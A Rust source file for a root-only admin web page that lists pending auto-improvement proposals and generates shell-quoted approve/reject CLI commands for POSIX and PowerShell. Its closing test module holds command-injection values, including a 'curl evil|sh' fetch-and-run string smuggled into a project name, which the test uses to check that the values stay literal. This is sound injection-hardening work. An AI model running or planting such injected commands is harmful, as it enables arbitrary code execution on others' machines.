//! `GET /pending` — root-only triage page for pending auto-improvement
//! proposals across every project.
//!
//! The page only reads. Approve and reject buttons post from the browser to
//! the existing `/admin/pending-writes/{id}/approve|reject` handlers, which
//! keep admission, audit, and the single writer. This crate adds no write
//! path.

use std::sync::Arc;

use ai_memory_core::{AuthLevel, LegacyBrowserAuth};
use ai_memory_store::{PendingAutoImproveReview, PendingAutoImproveScope};
use askama::Template;
use axum::Extension;
use axum::extract::{Query, State};
use axum::http::StatusCode;
use axum::response::{Html, IntoResponse, Response};
use serde::Deserialize;

use crate::state::WebState;
use crate::templates::{PendingRow, PendingView, SelectOption, encode_segment, page_href};

/// Most proposals one page load reads. A queue this long needs the CLI, and
/// the cap keeps the page (which embeds every body) bounded.
const PENDING_REVIEW_LIMIT: usize = 500;

const RULES_PREFIX: &str = "_rules/";

/// Sort orders the page offers, as `(value, label)`. The first is the default.
const SORTS: [(&str, &str); 4] = [
    (SORT_PROJECT, "Project, then staged date"),
    (SORT_CONFIDENCE_ASC, "Confidence, low first"),
    (SORT_CONFIDENCE_DESC, "Confidence, high first"),
    (SORT_STAGED_DESC, "Staged, newest first"),
];
const SORT_PROJECT: &str = "project";
const SORT_CONFIDENCE_ASC: &str = "confidence-asc";
const SORT_CONFIDENCE_DESC: &str = "confidence-desc";
const SORT_STAGED_DESC: &str = "staged-desc";

#[derive(Debug, Default, Deserialize)]
pub(crate) struct PendingQuery {
    /// Percent-encoded `workspace/project` key; empty means every project.
    #[serde(default)]
    project: Option<String>,
    #[serde(default)]
    sort: Option<String>,
}

/// Handler for `GET /pending`.
pub(crate) async fn handler(
    axum::Extension(i18n): axum::Extension<ai_memory_core::i18n::Localizer>,
    State(state): State<Arc<WebState>>,
    level: Option<Extension<AuthLevel>>,
    legacy: Option<Extension<LegacyBrowserAuth>>,
    Query(query): Query<PendingQuery>,
) -> Response {
    if let Err(response) = super::require_admin(&i18n, &state, level).await {
        return response;
    }

    let scopes = match state.reader.list_pending_auto_improve_scopes().await {
        Ok(scopes) => scopes,
        Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
    };
    // Match the request against known scopes only, so the filter can never
    // name a project that has no pending proposal.
    let filter = query
        .project
        .as_deref()
        .and_then(|key| scopes.iter().find(|scope| scope_key(scope) == key));
    let sort = query
        .sort
        .as_deref()
        .and_then(|raw| SORTS.iter().find(|(value, _)| *value == raw))
        .map_or(SORT_PROJECT, |(value, _)| *value);

    let mut reviews = match state
        .reader
        .list_pending_auto_improve_reviews(
            filter.map(|scope| (scope.workspace_id, scope.project_id)),
            PENDING_REVIEW_LIMIT + 1,
        )
        .await
    {
        Ok(reviews) => reviews,
        Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
    };
    let truncated = reviews.len() > PENDING_REVIEW_LIMIT;
    reviews.truncate(PENDING_REVIEW_LIMIT);
    sort_reviews(&mut reviews, sort);

    let total: u64 = scopes.iter().map(|scope| scope.pending).sum();
    let mut projects = vec![SelectOption {
        value: String::new(),
        label: format!("All projects ({total})"),
        selected: filter.is_none(),
    }];
    projects.extend(scopes.iter().map(|scope| SelectOption {
        value: scope_key(scope),
        label: format!(
            "{} ({})",
            display_scope(&scope.workspace_name, &scope.project_name),
            scope.pending
        ),
        selected: filter.is_some_and(|f| std::ptr::eq(f, scope)),
    }));
    let sorts = SORTS
        .iter()
        .map(|(value, label)| SelectOption {
            value: (*value).to_owned(),
            label: (*label).to_owned(),
            selected: *value == sort,
        })
        .collect();

    render(
        PendingView {
            i18n: i18n.clone(),
            rows: reviews
                .into_iter()
                .map(|review| pending_row(&i18n, review))
                .collect(),
            projects,
            sorts,
            total,
            project_count: scopes.len(),
            truncated,
            limit: PENDING_REVIEW_LIMIT,
            read_only: legacy.is_some(),
        },
        StatusCode::OK,
    )
}

/// Filter value for one project. Each name is percent-encoded, so a `/`
/// inside a name cannot make two projects share one key.
fn scope_key(scope: &PendingAutoImproveScope) -> String {
    format!(
        "{}/{}",
        encode_segment(&scope.workspace_name),
        encode_segment(&scope.project_name)
    )
}

fn scope_label(review: &PendingAutoImproveReview) -> String {
    display_scope(&review.workspace_name, &review.project_name)
}

/// `workspace/project` for display. When a name holds a `/`, both names are
/// quoted, so `a/b` + `c` and `a` + `b/c` stay distinct on screen.
fn display_scope(workspace: &str, project: &str) -> String {
    if workspace.contains('/') || project.contains('/') {
        format!("{workspace:?}/{project:?}")
    } else {
        format!("{workspace}/{project}")
    }
}

fn sort_reviews(reviews: &mut [PendingAutoImproveReview], sort: &str) {
    reviews.sort_by(|a, b| {
        let by_scope = || scope_label(a).cmp(&scope_label(b));
        let by_staged = a.summary.staged_at.cmp(&b.summary.staged_at);
        let by_confidence = a.summary.confidence.total_cmp(&b.summary.confidence);
        match sort {
            SORT_CONFIDENCE_ASC => by_confidence.then_with(by_scope).then(by_staged),
            SORT_CONFIDENCE_DESC => by_confidence.reverse().then_with(by_scope).then(by_staged),
            SORT_STAGED_DESC => by_staged.reverse().then_with(by_scope),
            _ => by_scope().then(by_staged),
        }
    });
}

fn pending_row(
    i18n: &ai_memory_core::i18n::Localizer,
    review: PendingAutoImproveReview,
) -> PendingRow {
    let label = scope_label(&review);
    let summary = review.summary;
    let target_path = summary.target_path.as_str().to_owned();
    let staged_relative = jiff::Timestamp::from_microsecond(summary.staged_at)
        .map(|ts| i18n.relative(&ts.to_string()))
        .unwrap_or_default();
    let id = summary.id.to_string();
    let posix_cli_approve =
        posix_cli_command("approve", &id, &review.workspace_name, &review.project_name);
    let posix_cli_reject =
        posix_cli_command("reject", &id, &review.workspace_name, &review.project_name);
    let powershell_cli_approve =
        powershell_cli_command("approve", &id, &review.workspace_name, &review.project_name);
    let powershell_cli_reject =
        powershell_cli_command("reject", &id, &review.workspace_name, &review.project_name);
    PendingRow {
        id,
        posix_cli_approve,
        posix_cli_reject,
        powershell_cli_approve,
        powershell_cli_reject,
        scope_label: label,
        target_href: page_href(&review.workspace_name, &review.project_name, &target_path),
        workspace: review.workspace_name,
        project: review.project_name,
        kind: summary.kind,
        operation: summary.operation.as_str().to_owned(),
        is_rule: target_path.starts_with(RULES_PREFIX),
        rewrites_existing: summary.operation
            != ai_memory_store::AutoImproveProposalOperation::Create,
        target_path,
        title: summary.title,
        confidence_pct: (summary.confidence * 100.0).round() as i64,
        staged_relative,
        edit_mode: review.edit_mode,
        rationale: review.rationale,
        body_markdown: review.body_markdown,
    }
}

/// The `ai-memory pending-writes <verb>` command a reviewer pastes into a
/// POSIX shell. Workspace and project names are free text, so each argument
/// must stay one argument instead of becoming shell syntax.
fn posix_cli_command(verb: &str, id: &str, workspace: &str, project: &str) -> String {
    format!(
        "ai-memory pending-writes {verb} {} --workspace {} --project {}",
        posix_quote(id),
        posix_quote(workspace),
        posix_quote(project)
    )
}

/// Quote one POSIX shell argument: unchanged when it holds only characters a
/// shell never interprets, otherwise single-quoted with embedded `'` escaped.
fn posix_quote(text: &str) -> String {
    if !text.is_empty()
        && text
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/' | ':' | '@'))
    {
        return text.to_owned();
    }
    format!("'{}'", text.replace('\'', "'\\''"))
}

/// The same command for PowerShell. Single-quoted PowerShell strings are
/// literal; an embedded apostrophe is represented by two apostrophes.
fn powershell_cli_command(verb: &str, id: &str, workspace: &str, project: &str) -> String {
    format!(
        "ai-memory pending-writes {verb} {} --workspace {} --project {}",
        powershell_quote(id),
        powershell_quote(workspace),
        powershell_quote(project)
    )
}

fn powershell_quote(text: &str) -> String {
    format!("'{}'", text.replace('\'', "''"))
}

fn render(view: impl Template, status: StatusCode) -> Response {
    match view.render() {
        Ok(body) => (status, Html(body)).into_response(),
        Err(_) => StatusCode::INTERNAL_SERVER_ERROR.into_response(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Ordinary POSIX commands stay readable while PowerShell arguments are
    /// explicitly quoted for that shell.
    #[test]
    fn cli_commands_render_legitimate_scope_names() {
        assert_eq!(
            posix_cli_command("approve", "abc123", "default", "my-app"),
            "ai-memory pending-writes approve abc123 --workspace default --project my-app"
        );
        assert_eq!(
            powershell_cli_command("approve", "abc123", "default", "my-app"),
            "ai-memory pending-writes approve 'abc123' --workspace 'default' --project 'my-app'"
        );
        assert_eq!(posix_quote(""), "''");
        assert_eq!(powershell_quote(""), "''");
    }

    /// Quotes, semicolons, and ampersands supplied through stored scope names
    /// remain literal characters in each supported shell.
    #[test]
    fn cli_commands_quote_hostile_scope_names_for_each_shell() {
        let workspace = "team'; echo owned; &";
        let project = "x'; curl evil|sh; &'";

        assert_eq!(
            posix_cli_command("reject", "abc123", workspace, project),
            "ai-memory pending-writes reject abc123 --workspace \
             'team'\\''; echo owned; &' --project 'x'\\''; curl evil|sh; &'\\'''"
        );
        assert_eq!(
            powershell_cli_command("reject", "abc123", workspace, project),
            "ai-memory pending-writes reject 'abc123' --workspace \
             'team''; echo owned; &' --project 'x''; curl evil|sh; &'''"
        );
    }
}
